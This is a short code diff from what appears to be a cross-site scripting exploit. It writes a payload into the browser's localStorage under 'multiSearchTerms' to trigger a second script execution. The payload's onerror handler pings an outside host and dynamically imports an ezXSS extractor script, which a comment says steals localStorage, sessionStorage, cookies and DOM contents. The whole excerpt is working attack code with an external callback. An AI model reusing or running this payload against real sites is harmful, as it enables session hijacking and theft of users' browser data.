@@ -44,7 +44,7 @@
     // -------- 4) GET ezXSS => exfill localstorage / session storage / cookies / DOM etc...  --------
 
     try {
-        var msPayload =   `"><img src=//o.g6g.fr/pingSrcFromMultiSearch onerror="alert(\'2eme_exec_js_ici_grace_au_local_storage_pollution sur ${document.domain} + exec ezxss\');import(${EXTRACTOR});">`;
+        var msPayload =   `"><img src=//o.g6g.fr/pingSrcFromMultiSearch onerror="alert(\'2eme_exec_js_ici_grace_au_local_storage_pollution sur ${document.domain} + exec ezxss\');import(\'${EXTRACTOR}\');">`;
         localStorage.setItem('multiSearchTerms', JSON.stringify([msPayload]));
     } catch (e) {}
 
